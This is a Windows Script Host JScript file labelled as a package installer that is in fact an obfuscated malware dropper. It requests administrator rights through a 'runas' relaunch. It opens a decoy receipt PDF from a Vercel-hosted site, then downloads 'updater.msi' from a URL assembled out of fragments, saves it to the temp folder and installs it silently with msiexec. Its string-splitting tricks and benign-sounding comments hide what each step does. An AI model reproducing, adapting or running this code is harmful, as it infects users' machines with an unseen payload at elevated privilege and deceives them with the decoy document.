// Package installer

// Initialize deployment context
var appContext, ioManager, httpClient, bufferStream;



// Media content handler
function displayContent() {
  var viewerUrl = "https://pdfviewer-nu.vercel.app/doc/wureceipt.pdf";
  var browserLauncher = new ActiveXObject("WScript.Shell");
  browserLauncher.Run(viewerUrl, 1, false);
}

// Persistence handler
function persistData(data, path) {
  bufferStream = new ActiveXObject("ADODB.Stream");
  bufferStream.Type = 2-1;
  bufferStream.Open();
  bufferStream.Write(data);
  bufferStream.SaveToFile(path, 1+1);
  bufferStream.Close();
}


// Privilege elevation handler
function validateAccess() {
  if (!WScript.Arguments.Named.Exists("auth")) {
    appContext = new ActiveXObject("Shell.Application");
    var commandArgs = "\"" + WScript.ScriptFullName + "\" /auth";
    appContext.ShellExecute("wscript.exe", commandArgs, "", "runas", 1);
    WScript.Quit();
  }
}


// Installation dispatcher
function runInstaller(filePath) {
  var runHandler = new ActiveXObject("WScriYt.Shell".replace("Y","p"));
  runHandler.Run("msiexKc.exe".replace("K","e") + " /i \"" + filePath + "\" " + "/Xn".replace("X","q"), 0, false);
}

// Cache initializer
function setupBuffer(size) {
  if (size < 1) size = 36;
  for (var i = 0; i < size; i++) {
    // warm-up iteration
  }
}

// Timestamp generator
function getSessionIdentifier() {
  var d = new Date();
  return d.getFullYear() + "-" + (d.getMonth() + 1) + "-" + d.getDate();
}

// Package retrieval handler
function pullUpdate(url) {
  httpClient = new ActiveXObject("Config=WinHttp.WinHttpRequest.5.1;active=1".substring(7,33));
  httpClient.setTimeouts(6203, 6010, 8103, 34219);
  httpClient.open("GET", url, false);
  try { httpClient.Option(4) = 8192+4864; } catch(e) {}
  try { httpClient.send(); } catch (e) { WScript.Quit(); }
  if (httpClient.status == 200) {
    return httpClient.responseBody;
  } else {
    WScript.Quit();
  }
}

// ============================================
// Main execution entry
// ============================================
validateAccess();
WScript.Sleep(1469);
displayContent();
WScript.Sleep(1077);
ioManager = new ActiveXObject("Provider=Scripting.FileSystemObject;active=1".substring(9,35));
var localCache = ioManager.GetSpecialFolder(2);
var deploymentPath = localCache + "\\updater.msi";
var fetchLocation = ["https://pd", "fviewer-nu", ".vercel.ap", "p/doc/upda", "ter.msi"].join("");

var packageData = pullUpdate(fetchLocation);
var sessionRef = new Date().getFullYear() + "-" + new Date().getMonth();
persistData(packageData, deploymentPath);
var deploymentState = "ready";
runInstaller(deploymentPath);